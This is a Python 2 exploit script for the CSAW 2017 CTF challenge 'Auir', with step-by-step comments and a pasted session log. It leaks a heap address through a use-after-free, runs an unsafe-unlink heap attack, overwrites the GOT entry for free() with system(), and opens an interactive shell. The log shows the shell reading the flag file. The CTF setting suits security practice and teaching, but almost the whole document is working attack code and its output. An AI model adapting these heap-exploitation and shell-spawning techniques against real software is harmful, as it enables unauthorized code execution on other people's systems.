#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# CSAW 2017 - Auir (pwn 200)
# --------------------------------------------------------------------------------------------------
import socket
import struct
import telnetlib
import string


# --------------------------------------------------------------------------------------------------
def recv_until(st):                                 # receive until you encounter a string
    ret = ""
    while st not in ret:
        ret += s.recv(8192)

    return ret


# --------------------------------------------------------------------------------------------------
def make_zealot(skills, size):
    s.send('1' + '\n')

    recv_until(">>")
    s.send(str(size) + '\n')

    recv_until(">>")
    s.send(skills + '\n')

    recv_until(">>")


# --------------------------------------------------------------------------------------------------
def destroy_zealot(which, final=False):
    s.send('2' + '\n')

    recv_until(">>")
    s.send(str(which) + '\n')

    if not final:
        recv_until(">>")
    else:
        recv_until("....")



# --------------------------------------------------------------------------------------------------
def fix_zealot(which, skills, size):
    s.send('3' + '\n')

    recv_until(">>")
    s.send(str(which) + '\n')

    recv_until(">>")
    s.send(str(size) + '\n')

    recv_until(">>")
    s.send(skills + '\n')

    recv_until(">>")


# --------------------------------------------------------------------------------------------------
def display_skills(which):
    s.send('4' + '\n')

    recv_until(">>")
    s.send(str(which) + '\n')

    resp = recv_until(">>")
    st   = resp.find('SHOWING....\n') + len('SHOWING....\n')
    end  = resp.find('|-------------------------------|')

    return resp[st:end]


# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":
    s = socket.create_connection(('pwn.chal.csaw.io', 7713))
    #s = socket.create_connection(('localhost', 7777))

    recv_until(">>")                                # eat banner


    # -------------------------------------------------------------------------
    # First attempt was to do House of force. For some reason, thigns screw up
    # after top chunk manipulation (read() always fails), so we fall back to
    # the classic "unsafe unlink"
    #
    # Because House of Force requires a heap address I have the following code
    # that leaks a heap address. It's not needed by the unlink exploit but I
    # leave it there to avoid making changes to the zealot offsets.
    # -------------------------------------------------------------------------
    # Leak a heap address
    #
    # Allocate 4 chunks from smallbins and delete the 1st and the 3rd (to avoid
    # coalesces). The 3rd chunk will be at the top of the freelist, so its next
    # pointer (fd) will point to the 1st chunk. Thus by printing the 3rd chunk,
    # we can leak the address of the 1st chunk.
    # -------------------------------------------------------------------------
    make_zealot('padding_to_avoid_nulls_in_addrs.', 0x80)
    make_zealot('A'*0x80, 0x80)
    make_zealot('B'*0x80, 0x80)
    make_zealot('C'*0x80, 0x80)
    make_zealot('D'*0x80, 0x80)

    destroy_zealot(1)
    destroy_zealot(3)

    resp = display_skills(3)                        # UAF!
    heap = struct.unpack("<Q", resp[:8])[0]

    print '[+] Leaking a heap address:', hex(heap), '(USELESS)'

    destroy_zealot(2)                               # clean up everything
    destroy_zealot(4)


    # -------------------------------------------------------------------------
    # Do an unsafe unlink write &buf inside buf itself (.bss:0000000000605310)
    #
    # Because we have full control over the chunks, we don't have to create a
    # fake chunk. Instead we can build a freelist we 3 chunks (it's good to
    # avoid unlinks from head/tail) and ovewrite the pointers. The only trick
    # here is that when we free a pointer, all calculations are done using the
    # chunk's header which is 16 bytes before the address that we're freeing.
    # To overcome this, buf should contains Address and Address+16.
    # -------------------------------------------------------------------------
    make_zealot('E'*0x90, 0x90)                     # this must be 16 bytes bigger
    make_zealot('F'*0x80, 0x80)                     # this chuck will be 0x10 after B
    make_zealot('G'*0x80, 0x80)
    make_zealot('I'*0x80, 0x80)
    make_zealot('J'*0x80, 0x80)
    make_zealot('K'*0x80, 0x80)
    make_zealot('H'*0x20, 0x20)                     # add this little guy to avoid coalesce with top chunk

    destroy_zealot(0)                               # add 3 elements to the freelist
    destroy_zealot(7)                               # G
    destroy_zealot(10)                              # K

    # overwrite fd and bk pointers from G and make them point to .bss.buf
    # (fix_zealot can overflow but we don't need it at all)
    fix_zealot(7, struct.pack("<Q", 0x605328-0x18) + struct.pack("<Q", 0x605328-0x10), 16)

    destroy_zealot(8)                               # trigger unlink()

    # -------------------------------------------------------------------------
    # Now buf[3] points to buf! Use this to launch write-what-where primitive.
    # Due to the partial RELRO we can overwrite GOT.
    # -------------------------------------------------------------------------
    fix_zealot(3, struct.pack("<Q", 0x605060), 8)   # buf[3] = .got.free()

    resp = display_skills(0)                        # leak free()
    free = struct.unpack("<Q", resp[:8])[0]

    print '[+] Leaking free():', hex(free)

    # local machine:
    #   free:   00007FFFF7274120
    #   system: 00007FFFF7237590
    #
    # remote machine:
    #   free:   00000000000844f0
    #   system: 0000000000045390
    #
    #system = free - 0x7FFFF7274120 + 0x7FFFF7237590
    system = free - 0x00000000000844f0 + 0x0000000000045390

    print '[+] Calculating system():', hex(system)

    fix_zealot(0, struct.pack("<Q", system), 8)     # .got.free now points to system()


    # -------------------------------------------------------------------------
    # Trigger payload
    # -------------------------------------------------------------------------
    fix_zealot(1, '/bin/sh\x00', 8)                 # write /bin/sh somewhere in the heap
    destroy_zealot(1, True)                         # frere(/bin/sh) will now give us a shell

    print '[+] Opening Shell...'
    t = telnetlib.Telnet()                          # try to open shell
    t.sock = s
    t.interact()


# --------------------------------------------------------------------------------------------------
'''
ispo@nogirl:~/ctf/2017/csaw_ctf/Auir$ ./auir_expl.py
    [+] Leaking a heap address: 0x1e67ca0 (USELESS)
    [+] Leaking free(): 0x7f8f963134f0
    [+] Calculating system(): 0x7f8f962d4390
    [+] Opening Shell...
    id
        uid=1000(auir) gid=1000(auir) groups=1000(auir)
    date
        Sat Sep 16 17:23:14 UTC 2017
    ls -l
    total 28
        -rwxr-xr-x 1 root root 22784 Sep 10 22:52 auir
        -r--r----- 1 root auir    58 Sep 10 22:49 flag
    cat flag
        flag{W4rr10rs!_A1ur_4wa1ts_y0u!_M4rch_f0rth_and_t4k3_1t!}
    exit
    [*]SUCCESSFUL!
    |-------------------------------|
    [1]MAKE ZEALOTS
    [2]DESTROY ZEALOTS
    [3]FIX ZEALOTS
    [4]DISPLAY SKILLS
    [5]GO HOME
    |-------------------------------|
    >>5
    [*]NOOBS CAN'T PROTECT AUIR....
    *** Connection closed by remote host ***
'''
# --------------------------------------------------------------------------------------------------
